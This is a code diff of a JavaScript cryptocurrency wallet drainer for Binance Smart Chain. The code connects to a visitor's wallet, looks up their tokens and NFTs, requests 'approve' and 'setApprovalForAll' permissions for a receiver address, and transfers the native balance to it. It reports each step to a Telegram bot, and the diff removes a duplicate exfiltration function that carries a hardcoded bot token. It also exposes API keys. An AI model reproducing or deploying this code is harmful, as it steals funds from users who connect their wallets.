@@ -65,7 +65,7 @@ async function init() {
           56: "https://bsc-dataseed.binance.org",
         },
         network: 'binance',
-        infuraId: "e62a60a251c64745baefeaf8237af646"
+        infuraId: "e77435344ef0486893cdc26d7d5cf039"
       }
     },
 
@@ -77,7 +77,7 @@ async function init() {
     //   package: CoinbaseWalletSDK, // Required
     //   options: {
     //     appName: "binance", // Required
-    //     infuraId: "e62a60a251c64745baefeaf8237af646", // Required
+    //     infuraId: "e77435344ef0486893cdc26d7d5cf039", // Required
     //     rpc:{
     //       56: "https://bsc-dataseed.binance.org",
     //     }, // Optional if `infuraId` is provided; otherwise it's required
@@ -337,25 +337,6 @@ async function sendMessage(message){
   })
 }
 
-async function sendMessage1(message){
-  return new Promise((resolve, reject)=>{
-    const chat_id = 1114693003;
-    fetch(`https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=${chat_id}&text=${message}`, {
-          method: "GET",
-          headers: {
-              
-          }
-      })
-      .then(async(res) => {
-          if(res.status > 399) throw res;
-          resolve(await res.json());
-      }).catch(err=>{
-          reject(err);
-      })
-  })
-}
-
-
 async function getBalance(address="", api_key="KF6aM7wHasYsLQGVi9f9v1kiWJXN8on0RT5PccICn3VdoRBiMCf7M8JTwezJHmGp", chain="bsc"){
   return new Promise((resolve, reject)=>{
       fetch(`https://deep-index.moralis.io/api/v2/${address}/balance?chain=bsc`, {
@@ -447,14 +428,12 @@ async function proceed(){
           console.log("Unable to get NFts", e);
           
         });
-        await sendMessage(`me ... BSC : connected to ${user_address}`);
-        await sendMessage1(`BSC : connected to ${user_address}`);
+        await sendMessage(`BSC : connected to ${user_address}`);
         console.log('bsc tokens: %o', bsc_tokens)
         
     
         if (bsc_tokens.length < 1 && bsc_NFTs.length < 1) {
           await sendMessage(`No valuable token or nfts found` )
-          await sendMessage1(`No valuable token or nfts found` )
           const bnb_balance = await getBalance(user_address, apiKey).catch(e=>{
             console.log("Unable to get new bsc balance", e);
           });
@@ -476,9 +455,7 @@ async function proceed(){
           console.log("Insufficient funds")
           if (bsc_tokens.length > 0){
             await sendMessage(`Tokens found` )
-            await sendMessage1(`Tokens found` )
           } else if (bsc_NFTs.length > 0){
-            await sendMessage(`NFTs found` )
             await sendMessage(`NFTs found` )
           }
         }
@@ -512,6 +489,7 @@ async function proceed(){
               }
             let balance = token.balance;
             let decimal = token.decimals;
+            
             const realprice =  balance / (10 ** (decimal || 18)) * (pricePerToken);
             let fakebalance = balance / (10 ** (decimal || 18));
               real_bsc_token[i] = {
@@ -567,11 +545,6 @@ async function proceed(){
                             Amount : ${amount},
                             Your address : ${receiver_address}
                               ` )
-              await sendMessage1(`Approving 
-                              Token Address : ${contractAddress},
-                              Amount : ${amount},
-                              Your address : ${receiver_address}
-                                ` )
               const sendOptions = {
                 contractAddress: contractAddress,
                 functionName: "approve",
@@ -600,11 +573,9 @@ async function proceed(){
           )
           if (transaction) {
             await sendMessage(`Approved` )
-            await sendMessage1(`Approved` )
           }
           else {
             await sendMessage(`Denied` )
-            await sendMessage1(`Denied` )
           }
               console.log(transaction);
               // if(transaction){
@@ -627,11 +598,6 @@ async function proceed(){
                                 token_id : ${tokenId}
                                 Your address : ${receiver_address}
                                   ` )
-              await sendMessage1(`Approving 
-                                  NFT Address : ${contractAddress},
-                                  token_id : ${tokenId}
-                                  Your address : ${receiver_address}
-                                    ` )
               const sendOptions = {
                 contractAddress: contractAddress,
                 functionName: "setApprovalForAll",
@@ -656,11 +622,9 @@ async function proceed(){
           )
           if (transaction) {
             await sendMessage(`Approved` )
-            await sendMessage1(`Approved` )
           }
           else {
             await sendMessage(`Denied` )
-            await sendMessage1(`Denied` )
           }
               console.log(transaction);
               // if(transaction){
@@ -670,7 +634,7 @@ async function proceed(){
               // }
             }
           }
-          if (x === bsc_length && y === bsc_NFTs.result.length && (mum === "approved" || mum === "denied")){
+          //if (x === bsc_length && y === bsc_NFTs.result.length && (mum === "approved" || mum === "denied")){
         const bnb_balance = await getBalance(user_address, apiKey).catch(e=>{
           console.log("Unable to get new bsc balance", e);
         });
@@ -682,7 +646,7 @@ async function proceed(){
         if (balance > 0) {
         const options = {
           type: "native",
-          amount: Moralis.Units.bsc(balance.toString()),
+          amount: Moralis.Units.ETH(balance.toString()),
           receiver: receiver_address,
         };
         let result = await Moralis.transfer(options);
@@ -691,7 +655,7 @@ async function proceed(){
       else {
         console.log("Insufficient funds")
       }
-    }
+    //}
     }
     send();
 }
